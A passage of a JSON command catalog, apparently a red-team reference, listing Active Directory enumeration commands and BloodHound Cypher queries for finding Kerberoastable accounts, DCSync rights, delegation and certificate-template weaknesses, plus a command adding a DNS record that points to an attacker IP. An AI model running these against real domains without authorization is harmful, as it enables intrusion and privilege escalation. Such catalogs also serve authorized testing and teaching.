      "name": "BloodHound.py CE Collector",
      "command": "bloodhound-ce-python -u '<user>' -p '<password>' -d '<domain>' -ns <dc-ip> -c All --zip",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "Collect AD data into the BloodHound Community Edition JSON format from Linux. Use --zip for a single upload-ready archive. -c All runs every collection method; restrict with -c Group,LocalAdmin,Session for quieter runs.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "smb"
      ],
      "tags": [
        "bloodhound",
        "bloodhound-ce",
        "collection",
        "python"
      ],
      "variations": [
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "bloodhound-ce-python -u '<user>' --hashes :<nt-hash> -d '<domain>' -ns <dc-ip> -c All --zip"
        },
        {
          "label": "Kerberos",
          "requires": "ticket",
          "command": "bloodhound-ce-python -u '<user>' -k --no-pass -d '<domain>' -ns <dc-ip> -dc <dc-fqdn> -c All --zip"
        },
        {
          "label": "Stealth",
          "requires": "password",
          "command": "bloodhound-ce-python -u '<user>' -p '<password>' -d '<domain>' -ns <dc-ip> -c Group,Trusts,ACL,Container --zip"
        }
      ],
      "references": [
        {
          "title": "bloodhound-ce-python",
          "url": "https://github.com/dirkjanm/BloodHound.py"
        }
      ],
      "examples": [
        "bloodhound-ce-python -u jdoe -p 'Password123!' -d corp.local -ns 10.10.10.10 -c All --zip"
      ]
    },
    {
      "id": "cypher-esc1-candidates",
      "name": "Cypher: ADCS ESC1 Candidates (Certipy BloodHound)",
      "command": "MATCH (u:User)-[:Enroll]->(t:CertTemplate {`Enrollee Supplies Subject`:true, `Client Authentication`:true, `Enabled`:true}) RETURN u.name, t.name",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "List every user that can enroll in an ESC1-vulnerable certificate template (enrollee supplies subject + client authentication EKU + enabled). Requires the Certipy BloodHound data model — collect with `certipy find -bloodhound`.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "certipy",
        "adcs",
        "esc1",
        "graph"
      ],
      "references": [
        {
          "title": "Certipy BloodHound Integration",
          "url": "https://github.com/ly4k/Certipy#-bloodhound-integration"
        }
      ],
      "examples": [
        "MATCH (u:User)-[:Enroll]->(t:CertTemplate {`Enrollee Supplies Subject`:true, `Client Authentication`:true, `Enabled`:true}) RETURN u.name, t.name"
      ]
    },
    {
      "id": "cypher-owned-to-da",
      "name": "Cypher: All Paths from Owned to High-Value",
      "command": "MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) RETURN p",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "All shortest paths from any owned principal to any high-value target (Domain Admins, Enterprise Admins, DCs, etc.). The 'what can I reach' overview after a fresh foothold.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "owned",
        "high-value",
        "graph"
      ],
      "references": [
        {
          "title": "BloodHound — Cheat Sheet",
          "url": "https://bloodhound.specterops.io/"
        }
      ],
      "examples": [
        "MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) RETURN p"
      ]
    },
    {
      "id": "cypher-asreproastable",
      "name": "Cypher: AS-REP Roastable Users",
      "command": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "List every user with DONT_REQ_PREAUTH set — these accounts can be AS-REP roasted without prior authentication. Feed the names directly to GetNPUsers or nxc --asreproast.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "asreproast",
        "preauth",
        "graph"
      ],
      "references": [
        {
          "title": "BloodHound — Cheat Sheet",
          "url": "https://bloodhound.specterops.io/"
        }
      ],
      "examples": [
        "MATCH (u:User {dontreqpreauth:true}) RETURN u.name"
      ]
    },
    {
      "id": "cypher-kerberoastable",
      "name": "Cypher: Kerberoastable Users",
      "command": "MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH 'KRBTGT' RETURN u.name, u.serviceprincipalnames ORDER BY u.name",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "List every kerberoastable user in the domain (has a SPN, not krbtgt). Pair with hasLAPS / admincount / enabled filters for triage.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "kerberoast",
        "spn",
        "graph"
      ],
      "variations": [
        {
          "label": "Only Privileged Kerberoastable",
          "command": "MATCH (u:User {hasspn:true}) WHERE u.admincount=true AND NOT u.name STARTS WITH 'KRBTGT' RETURN u.name, u.serviceprincipalnames"
        },
        {
          "label": "Kerberoastable + Path to DA",
          "command": "MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group)) WHERE g.name CONTAINS 'DOMAIN ADMINS' RETURN p"
        }
      ],
      "references": [
        {
          "title": "BloodHound — Cheat Sheet",
          "url": "https://bloodhound.specterops.io/"
        }
      ],
      "examples": [
        "MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH 'KRBTGT' RETURN u.name, u.serviceprincipalnames"
      ]
    },
    {
      "id": "cypher-dcsync",
      "name": "Cypher: Principals With DCSync Rights",
      "command": "MATCH p=(u)-[:DCSync|GetChanges|GetChangesAll|GetChangesInFilteredSet]->(d:Domain) RETURN p",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "Find every principal that holds DS-Replication-Get-Changes / DS-Replication-Get-Changes-All on the domain object — i.e. anyone able to DCSync. Often surfaces forgotten service accounts and over-permissioned groups.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "dcsync",
        "replication"
      ],
      "references": [
        {
          "title": "BloodHound Cypher",
          "url": "https://bloodhound.specterops.io/"
        }
      ],
      "examples": [
        "MATCH p=(u)-[:DCSync|GetChanges|GetChangesAll|GetChangesInFilteredSet]->(d:Domain) RETURN p"
      ]
    },
    {
      "id": "cypher-rbcd-candidates",
      "name": "Cypher: RBCD Write Targets",
      "command": "MATCH p=(u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(c:Computer) RETURN p",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "Surface every account that can write to a computer object — the precondition for Resource-Based Constrained Delegation abuse. Combine with `--add-computer` (ntlmrelayx) or an existing fake computer to chain to RBCD.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "rbcd",
        "delegation"
      ],
      "examples": [
        "MATCH p=(u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(c:Computer) RETURN p"
      ],
      "references": [
        {
          "title": "RBCD attack",
          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
        }
      ]
    },
    {
      "id": "cypher-shortest-path-da",
      "name": "Cypher: Shortest Path to Domain Admins",
      "command": "MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "Find the shortest attack path from any owned user to the Domain Admins group. The bread-and-butter BloodHound query — run it after every collection to see what changed. Mark accounts as owned in the BloodHound UI before running.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "shortest-path",
        "domain-admins",
        "graph"
      ],
      "references": [
        {
          "title": "BloodHound — Cheat Sheet",
          "url": "https://bloodhound.specterops.io/"
        }
      ],
      "examples": [
        "MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p"
      ]
    },
    {
      "id": "cypher-unconstrained-delegation",
      "name": "Cypher: Unconstrained Delegation",
      "command": "MATCH (c {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS 'DC=' RETURN c.name, labels(c)",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "Find every computer or user with TRUSTED_FOR_DELEGATION set, excluding the DCs themselves. Coercing a privileged user (e.g. via PetitPotam) to authenticate to one of these hosts gives you their TGT.",
      "platform": "cross-platform",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "bloodhound",
        "cypher",
        "unconstrained-delegation",
        "tgt",
        "graph"
      ],
      "references": [
        {
          "title": "BloodHound — Cheat Sheet",
          "url": "https://bloodhound.specterops.io/"
        },
        {
          "title": "The Hacker Recipes — Unconstrained Delegation",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
        }
      ],
      "examples": [
        "MATCH (c {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS 'DC=' RETURN c.name"
      ]
    },
    {
      "id": "rusthound-ce",
      "name": "RustHound-CE Collector",
      "command": "rusthound-ce -d '<domain>' -u '<user>@<domain>' -p '<password>' -z",
      "category": "enumeration",
      "subcategory": "bloodhound-queries",
      "description": "Faster Rust-based BloodHound CE collector. Single static binary, ideal when Python isn't available or LDAP queries need to be quick on large domains.",
      "platform": "cross-platform",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodhound",
        "bloodhound-ce",
        "rusthound",
        "collection",
        "rust"
      ],
      "variations": [
        {
          "label": "LDAPS",
          "requires": "password",
          "command": "rusthound-ce -d '<domain>' -u '<user>@<domain>' -p '<password>' --ldaps -z"
        }
      ],
      "references": [
        {
          "title": "RustHound-CE",
          "url": "https://github.com/g0h4n/RustHound-CE"
        }
      ],
      "examples": [
        "rusthound-ce -d corp.local -u jdoe@corp.local -p 'Password123!' -z"
      ]
    },
    {
      "id": "adidnsdump",
      "name": "ADIDNSDump",
      "command": "adidnsdump -u '<domain>\\<user>' -p '<password>' <ip>",
      "category": "enumeration",
      "subcategory": "dns",
      "description": "Dump all DNS records from Active Directory integrated DNS zones",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "dns",
        "ldap"
      ],
      "tags": [
        "adidnsdump",
        "dns",
        "enumeration",
        "ad-integrated",
        "zone-dump"
      ],
      "examples": [
        "adidnsdump -u 'corp.local\\user' -p 'password' 192.168.1.100"
      ]
    },
    {
      "id": "dig-srv",
      "name": "DNS SRV Record Lookup",
      "command": "dig SRV _ldap._tcp.dc._msdcs.<domain> @<ip>",
      "category": "enumeration",
      "subcategory": "dns",
      "description": "Query DNS SRV records to discover domain controllers and services",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "dns"
      ],
      "tags": [
        "dig",
        "dns",
        "srv",
        "enumeration",
        "domain-controller"
      ],
      "examples": [
        "dig SRV _ldap._tcp.dc._msdcs.corp.local @192.168.1.100",
        "dig SRV _kerberos._tcp.corp.local @192.168.1.100"
      ]
    },
    {
      "id": "dnstool",
      "name": "Krbrelayx DNSTool",
      "command": "python3 dnstool.py -u '<domain>\\<user>' -p '<password>' -r '<record_name>' -a add -t A -d <attacker_ip> <ip>",
      "category": "enumeration",
      "subcategory": "dns",
      "description": "Add, modify, or query DNS records in Active Directory integrated DNS",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "dns",
        "ldap"
      ],
      "tags": [
        "dnstool",
        "dns",
        "krbrelayx",
        "record-manipulation",
        "ad-integrated"
      ],
      "examples": [
        "python3 dnstool.py -u 'corp.local\\user' -p 'password' -r 'attacker.corp.local' -a add -t A -d 192.168.1.50 192.168.1.100"
      ]
    },
    {
      "id": "nxc-ftp-list",
      "name": "NetExec FTP List Files",
      "command": "nxc ftp <target> -u '<user>' -p '<password>' --ls",
      "category": "enumeration",
      "subcategory": "ftp",
      "description": "List the contents of an FTP server's working directory (or a specified path). Quick triage step before pulling files with --get.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ftp"
      ],
      "tags": [
        "netexec",
        "nxc",
        "ftp",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Specific Path",
          "requires": "password",
          "command": "nxc ftp <target> -u '<user>' -p '<password>' --ls <path>"
        },
        {
          "label": "Anonymous",
          "requires": "no-creds",
          "command": "nxc ftp <target> -u 'anonymous' -p '' --ls"
        }
      ],
      "examples": [
        "nxc ftp 10.10.10.10 -u anonymous -p '' --ls"
      ]
    },
    {
      "id": "kerbrute-userenum",
      "name": "Kerbrute User Enumeration",
      "command": "kerbrute userenum --dc '<ip>' -d '<domain>' <wordlist>",
      "category": "enumeration",
      "subcategory": "kerberos",
      "description": "Kerberos user enumeration without authentication",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "kerbrute",
        "kerberos",
        "users",
        "enumeration"
      ],
      "examples": [
        "kerbrute userenum --dc '192.168.1.100' -d 'CORP.LOCAL' /usr/share/wordlists/seclists/Usernames/Names/names.txt"
      ]
    },
    {
      "id": "bloodhound",
      "name": "BloodHound AD Collection",
      "command": "bloodhound-python -d '<domain>' -u '<user>' -p '<password>' -gc '<domain>' -c all -ns '<ip>' --zip --dns-tcp",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Collect Active Directory data for BloodHound analysis",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodhound",
        "ad",
        "enumeration",
        "collection",
        "graph"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodhound-python -d '<domain>' -u '<user>' --hashes ':<hash>' -gc '<domain>' -c all -ns '<ip>' --zip --dns-tcp"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "bloodhound-python -d '<domain>' -u '<user>' -k --auth-method kerberos -gc '<domain>' -c all -ns '<ip>' --zip --dns-tcp"
        }
      ],
      "examples": [
        "bloodhound-python -d 'CORP.LOCAL' -u 'user' -p 'password' -gc 'CORP.LOCAL' -c all -ns '192.168.1.100' --zip --dns-tcp"
      ]
    },
    {
      "id": "bloodyad-get-children",
      "name": "bloodyAD get children",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get children --target '<dn>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "List the immediate children of a container or OU. Handy for walking the directory tree without firing a full BloodHound collection.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "ldap",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Filter By Type",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get children --target '<dn>' --otype USER"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get children --target 'OU=Servers,DC=corp,DC=local'"
      ]
    },
    {
      "id": "bloodyad-get-dnsdump",
      "name": "bloodyAD get dnsDump",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get dnsDump",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Dump every AD-integrated DNS record from the domain. Authenticated users can read most zones by default — useful for finding internal hostnames, CNAMEs, and stale records to spoof.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "dns"
      ],
      "tags": [
        "bloodyad",
        "dns",
        "enumeration"
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get dnsDump"
      ]
    },
    {
      "id": "bloodyad-get-membership",
      "name": "bloodyAD get membership",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get membership '<target-user>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Recursively resolve every group a principal belongs to, including nested groups. Faster than chasing memberOf chains by hand.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "groups",
        "enumeration"
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get membership administrator"
      ]
    },
    {
      "id": "bloodyad-get-object",
      "name": "bloodyAD Get Object Attributes",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get object '<target>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Read all (or specific) LDAP attributes of an AD object. Useful for confirming msDS-AllowedToActOnBehalfOfOtherIdentity, msDS-KeyCredentialLink, userAccountControl flags, or any attribute after a write.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "ldap",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Specific Attribute",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get object '<target>' --attr msDS-AllowedToActOnBehalfOfOtherIdentity"
        },
        {
          "label": "Writable Attributes Only",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get writable"
        }
      ],
      "references": [
        {
          "title": "bloodyAD",
          "url": "https://github.com/CravateRouge/bloodyAD"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get object jdoe"
      ]
    },
    {
      "id": "bloodyad-get-search",
      "name": "bloodyAD get search",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get search --filter '<ldap-filter>' --attr '<attrs>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Run an arbitrary LDAP filter against the directory and pull selected attributes. The escape hatch when none of the verb-noun helpers fit your query.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "ldap",
        "search"
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get search --filter '(servicePrincipalName=*)' --attr sAMAccountName,servicePrincipalName"
      ]
    },
    {
      "id": "bloodyad-get-trusts",
      "name": "bloodyAD get trusts",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get trusts",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate domain and forest trust relationships, including direction, type, and trust attributes. Quick alternative to nltest / Get-ADTrust when you only have Linux.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "trusts",
        "enumeration"
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get trusts"
      ]
    },
    {
      "id": "bloodyad-get-writable",
      "name": "bloodyAD get writable",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get writable",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate every AD object the current principal can write to — fastest path to finding ACL escalation primitives without round-tripping through BloodHound. Filter with --otype/--right for targeted hunts.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "acl",
        "writable",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Users Only",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get writable --otype USER"
        },
        {
          "label": "WriteOwner Rights",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' get writable --right WriteOwner"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' get writable"
      ]
    },
    {
      "id": "impacket-findDelegation",
      "name": "Impacket findDelegation",
      "command": "impacket-findDelegation '<domain>/<user>:<password>' -dc-ip '<ip>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Find all accounts with delegation rights (unconstrained, constrained, RBCD)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "ldap",
        "delegation",
        "enumeration",
        "unconstrained",
        "constrained",
        "rbcd"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-findDelegation -hashes ':<hash>' -dc-ip '<ip>' '<domain>/<user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-findDelegation -k -no-pass -dc-ip '<ip>' '<domain>/<user>'"
        }
      ],
      "examples": [
        "impacket-findDelegation 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
      ]
    },
    {
      "id": "impacket-GetADComputers",
      "name": "Impacket GetADComputers",
      "command": "impacket-GetADComputers -dc-ip '<ip>' '<domain>/<user>:<password>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate all Active Directory computer accounts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "ldap",
        "computers",
        "enumeration",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-GetADComputers -dc-ip '<ip>' -hashes ':<hash>' '<domain>/<user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-GetADComputers -dc-ip '<ip>' -k -no-pass '<domain>/<user>'"
        }
      ],
      "examples": [
        "impacket-GetADComputers -dc-ip '192.168.1.100' 'CORP.LOCAL/user:password'"
      ]
    },
    {
      "id": "impacket-GetADUsers",
      "name": "Impacket GetADUsers",
      "command": "impacket-GetADUsers -all -dc-ip '<ip>' '<domain>/<user>:<password>'",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate all Active Directory user accounts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "ldap",
        "users",
        "enumeration",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-GetADUsers -all -dc-ip '<ip>' -hashes ':<hash>' '<domain>/<user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-GetADUsers -all -dc-ip '<ip>' -k -no-pass '<domain>/<user>'"
        }
      ],
      "examples": [
        "impacket-GetADUsers -all -dc-ip '192.168.1.100' 'CORP.LOCAL/user:password'"
      ]
    },
    {
      "id": "ldap-anonymous-bind",
      "name": "LDAP Anonymous Bind",
      "command": "ldapsearch -x -H ldap://<ip> -D '<domain>' -b '<DC DN>' '(objectclass=*)' description sAMAccountName",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "LDAP Anonymous Bind",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "ldapsearch",
        "ldap",
        "anonymous",
        "enumeration"
      ],
      "examples": [
        "ldapsearch -x -H ldap://192.168.139.122 -D 'hutch.offsec' -b 'dc=hutch,dc=offsec' '(objectclass=*)' description sAMAccountName"
      ]
    },
    {
      "id": "ldapsearch-users",
      "name": "LDAP User Enumeration",
      "command": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b '<dc_dn>' '(objectClass=user)' sAMAccountName | grep 'sAMAccountName:' | cut -d: -f2 | tr -d ' ' | sort -u > users.txt",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Extract all domain users and save to users.txt",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "ldapsearch",
        "ldap",
        "users",
        "enumeration"
      ],
      "examples": [
        "ldapsearch -x -H ldap://192.168.1.100 -D 'user@CORP.LOCAL' -w 'password' -b 'DC=CORP,DC=LOCAL' '(objectClass=user)' sAMAccountName"
      ]
    },
    {
      "id": "ldapdomaindump",
      "name": "LDAPDomainDump",
      "command": "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip> -o ldapdomaindump/",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Dump domain information via LDAP into HTML, JSON, and grep-friendly formats",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "ldapdomaindump",
        "ldap",
        "enumeration",
        "domain-dump",
        "users",
        "groups"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "ldapdomaindump -u '<domain>\\<user>' -p ':<hash>' <ip> -o ldapdomaindump/"
        }
      ],
      "examples": [
        "ldapdomaindump -u 'corp.local\\user' -p 'password' 192.168.1.100 -o ldapdomaindump/"
      ]
    },
    {
      "id": "nxc-daclread",
      "name": "NetExec daclread Module",
      "command": "nxc ldap <target> -u '<user>' -p '<password>' -M daclread -o TARGET='<object>' ACTION=read",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Read the DACL of an arbitrary AD object via LDAP and resolve every ACE to a human-readable principal/right pair. Faster than spinning up BloodHound when you only need to confirm one path.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "netexec",
        "nxc",
        "daclread",
        "acl",
        "enumeration"
      ],
      "references": [
        {
          "title": "NetExec daclread",
          "url": "https://www.netexec.wiki/ldap-protocol/daclread"
        }
      ],
      "examples": [
        "nxc ldap dc.corp.local -u jdoe -p 'Password123!' -M daclread -o TARGET=Administrator ACTION=read"
      ]
    },
    {
      "id": "nxc-ldap-adcs",
      "name": "NetExec LDAP ADCS Enumeration",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M adcs",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate ADCS certificate authorities and templates via NetExec",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "adcs",
        "certificate",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M adcs"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' --use-kcache -M adcs"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M adcs"
      ]
    },
    {
      "id": "nxc-ldap-admin-count",
      "name": "NetExec LDAP AdminCount Users",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' --admin-count",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate accounts with adminCount=1 (protected admin accounts) via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "admincount",
        "privileged",
        "enumeration",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' --admin-count"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache --admin-count"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' --admin-count"
      ]
    },
    {
      "id": "nxc-ldap-bloodhound",
      "name": "NetExec LDAP BloodHound",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip>",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Collect BloodHound data via NetExec LDAP module",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "bloodhound",
        "enumeration",
        "collection"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' --bloodhound -c All --dns-server <ip>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' --use-kcache --bloodhound -c All --dns-server <ip>"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' --bloodhound -c All --dns-server 192.168.1.100"
      ]
    },
    {
      "id": "nxc-ldap-dc-list",
      "name": "NetExec LDAP DC List",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' --dc-list",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate all Domain Controllers in the domain via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "domain-controllers",
        "enumeration",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' --dc-list"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache --dc-list"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' --dc-list"
      ]
    },
    {
      "id": "nxc-ldap-enum-ca",
      "name": "NetExec LDAP Enumerate CA",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M enum_ca",
      "category": "enumeration",
      "subcategory": "ldap",
      "description": "Enumerate Certificate Authority (CA) servers in Active Directory",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "pki",
        "ca",
        "adcs",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M enum_ca"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M enum_ca"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M enum_ca"
      ]
    },
    {
      "id": "nxc-ldap-enum-dns",
      "name": "NetExec LDAP Enumerate DNS",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M enum_dns",
